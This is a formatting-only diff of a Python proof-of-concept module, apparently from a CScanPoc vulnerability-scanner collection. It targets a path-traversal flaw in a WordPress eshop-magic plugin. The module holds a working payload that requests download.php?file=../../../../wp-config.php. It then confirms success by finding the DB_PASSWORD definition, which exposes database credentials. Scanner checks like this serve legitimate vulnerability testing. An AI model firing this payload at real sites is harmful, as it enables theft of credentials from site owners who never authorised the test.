@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'WordPress_0062' # 平台漏洞编号，留空
+    vuln_id = 'WordPress_0062'  # 平台漏洞编号，留空
     name = 'WordPress 配置文件下载'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_DOWNLOAD # 漏洞类型
+    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         WordPress /wp-content/plugins/eshop-magic/download.php?file=../../../../wp-config.php
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'WordPress'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'a7afcbd6-0962-40b4-83aa-8a71cdca8a81'
@@ -32,7 +34,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
             arg = self.target
             payload = '/wp-content/plugins/eshop-magic/download.php?file=../../../../wp-config.php'
@@ -41,7 +43,7 @@ class Poc(ABPoc):
             if code == 200:
                 m = re.search("define\('DB_PASSWORD'", res)
                 if m:
-                    #security_hole(verify_url)
+                    # security_hole(verify_url)
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
@@ -50,6 +52,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
